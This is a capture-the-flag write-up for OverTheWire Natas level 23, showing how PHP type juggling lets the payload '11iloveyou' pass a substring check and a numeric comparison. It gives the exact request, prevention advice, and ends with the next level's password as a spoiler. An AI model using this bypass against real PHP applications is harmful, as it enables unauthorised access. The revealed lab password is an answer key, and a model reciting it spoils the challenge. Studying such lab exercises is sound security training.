# Natas Level 23 → 24

## Objective

Retrieve the password for the next level by exploiting PHP's automatic type conversion during numeric comparison.

The application requires the supplied password to:

* Contain the string `"iloveyou"`.
* Be greater than `10`.

At first glance, these two conditions appear contradictory, but PHP's type juggling makes it possible.

---

## Enumeration

* Logged into the application.
* Reviewed the webpage.
* Viewed the source code.
* Found that the application checks the `passwd` parameter.
* Observed two validation conditions:

  * The password must contain `"iloveyou"`.
  * The password must be greater than `10`.

---

# Source Code Analysis

The application checks whether the `passwd` parameter exists.

```php
if(array_key_exists("passwd", $_REQUEST)){
```

Then it validates the input.

```php
if(
    strstr($_REQUEST["passwd"], "iloveyou")
    &&
    ($_REQUEST["passwd"] > 10)
){
    // Reveal next password
}
```

Both conditions must evaluate to `true`.

---

## First Condition

The application uses:

```php
strstr($_REQUEST["passwd"], "iloveyou")
```

`strstr()` searches for a substring.

Example:

```php
strstr("11iloveyou", "iloveyou");
```

Returns:

```text
iloveyou
```

Since the substring exists, the condition evaluates to **true**.

---

## Second Condition

The application compares:

```php
$_REQUEST["passwd"] > 10
```

Although `passwd` is a string, PHP automatically converts it into a number during comparison.

Examples:

```text
"20"          -> 20
"11iloveyou"  -> 11
"9iloveyou"   -> 9
"iloveyou"    -> 0
```

PHP only considers the numeric prefix at the beginning of the string.

---

# Vulnerability

## PHP Type Juggling

PHP automatically converts strings into numbers when using numeric comparison operators.

Example:

```php
"11abc" > 10
```

PHP interprets this as:

```php
11 > 10
```

Result:

```text
True
```

Likewise,

```php
"iloveyou" > 10
```

becomes:

```php
0 > 10
```

Result:

```text
False
```

---

# Exploitation Strategy

The goal is to satisfy both conditions simultaneously.

Requirements:

* Include `"iloveyou"` somewhere in the input.
* Begin the string with a number greater than `10`.

Payload:

```text
11iloveyou
```

Evaluation:

First condition:

```php
strstr("11iloveyou", "iloveyou")
```

Result:

```text
True
```

Second condition:

```php
"11iloveyou" > 10
```

PHP converts:

```text
11iloveyou
```

to

```text
11
```

Comparison:

```php
11 > 10
```

Result:

```text
True
```

Both conditions pass successfully.

---

# Exploitation

Request:

```http
GET /?passwd=11iloveyou HTTP/1.1
Host: natas23.natas.labs.overthewire.org
```

The application evaluates:

```php
strstr("11iloveyou", "iloveyou")
```

↓

```text
True
```

and

```php
"11iloveyou" > 10
```

↓

```text
11 > 10
```

↓

```text
True
```

The next level password is displayed.

---

# Attack Flow

```
Open Website
      |
      v
Review Source Code
      |
      v
Find strstr() Check
      |
      v
Find Numeric Comparison
      |
      v
Understand PHP Type Conversion
      |
      v
Craft Payload
      |
      v
11iloveyou
      |
      v
Both Conditions Become True
      |
      v
Retrieve Next Password
```

---

# Result

The password was successfully retrieved by exploiting PHP's automatic type conversion.

Although the input was a string, PHP interpreted its numeric prefix as an integer during comparison, allowing both validation checks to succeed.

---

# Prevention

* Avoid relying on automatic type conversion.
* Validate the expected input type before performing comparisons.
* Use strict validation when numeric values are required.

Example:

```php
if(
    is_numeric($_REQUEST["passwd"]) &&
    (int)$_REQUEST["passwd"] > 10
){
    ...
}
```

If the value is intended to be a string, avoid numeric comparisons entirely.

---

# Key Takeaways

* PHP automatically converts strings during numeric comparisons.
* Numeric prefixes in strings influence comparison results.
* `strstr()` only checks whether a substring exists.
* Mixing string validation with numeric comparison can introduce security flaws.
* Always validate and compare values using the correct data types.

---

<details>
<summary><strong>🔑 Password (Spoiler)</strong></summary>

```text
Username : natas24
Password : shlL4BvOtawNCd81dwdKRHFzmTEjYYQX
```

</details>
